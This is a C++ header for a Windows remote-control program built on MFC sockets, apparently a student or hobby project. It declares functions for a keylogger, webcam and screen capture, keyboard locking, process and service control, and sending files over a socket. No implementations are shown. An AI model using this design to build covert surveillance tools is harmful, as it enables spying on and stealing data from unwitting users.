#ifndef UTILS_H
#define UTILS_H

#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <iostream>
#include <functional>
#include <filesystem>
#include <unordered_map>
#include <afxsock.h>
#include <windows.h>
#include <tlhelp32.h>
#include <opencv2/opencv.hpp>

using namespace std;
using namespace cv;

#define PORT 8080
#define BUFFER_SIZE 2048
#define SHUTDOWN_DELAY 15

extern stringstream inp, out;
extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, requestFilePath;
extern unordered_map<string, unordered_map<string, function<void()>>> handlers;

string drawTable(const vector<string>& headers, const vector<vector<string>>& rowData);
string getFileName(const string& filePath);
void getInstruction();
void listDir(const string& dirPath);
void listApps();
void startApp(LPWSTR appPath);
void stopApp(DWORD processID);
void listServices();
void startServiceByName(LPCWSTR serviceName);
void stopServiceByName(LPCWSTR serviceName);
void shutdownMachine();
void restartMachine();
void startKeylogger();
void stopKeylogger();
void startCamera();
void stopCamera();
void captureCamera();
void captureScreen();
void lockKeyboard();
void unlockKeyboard();
void deleteFile(LPCWSTR filePath);
void copyFile(LPCWSTR src, LPCWSTR dst);
void sendFile(CSocket& socket, const string& filePath);

#endif